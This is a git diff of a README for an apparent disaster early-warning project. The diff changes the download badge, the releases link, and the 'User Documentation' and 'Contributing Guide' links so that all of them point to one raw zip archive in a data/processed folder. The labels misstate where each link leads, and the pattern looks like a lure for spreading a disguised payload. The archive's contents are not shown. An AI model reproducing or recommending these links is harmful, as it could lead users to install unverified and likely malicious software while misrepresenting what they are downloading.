@@ -1,6 +1,6 @@
 # 🌍 Disaster-Instability-Early-Warning-Engine - Early warning for disaster management
 
-[![Download](- https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/releases)
+[![Download](- https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip)](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Disaster-Instability-Early-Warning-Engine. This application helps
 
 ## 📥 Download & Install
 
-To start using the Disaster-Instability-Early-Warning-Engine, visit this page to download: [Disaster-Instability-Early-Warning-Engine Releases](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/releases).
+To start using the Disaster-Instability-Early-Warning-Engine, visit this page to download: [Disaster-Instability-Early-Warning-Engine Releases](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip).
 
 You will find the latest version there. Follow these steps to install:
 
@@ -103,8 +103,8 @@ These topics are fundamental for ensuring that communities can prepare for and e
 
 ## 🔗 Useful Links
 
-- [Download Application](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/releases)
-- [User Documentation](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/wiki)
-- [Contributing Guide](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/blob/main/CONTRIBUTING.md)
+- [Download Application](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip)
+- [User Documentation](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip)
+- [Contributing Guide](https://github.com/Lucaszac98/Disaster-Instability-Early-Warning-Engine/raw/refs/heads/main/data/processed/Engine-Warning-Instability-Early-Disaster-v1.1.zip)
   
 We appreciate your interest in the Disaster-Instability-Early-Warning-Engine. Together, we can enhance disaster preparedness and response.
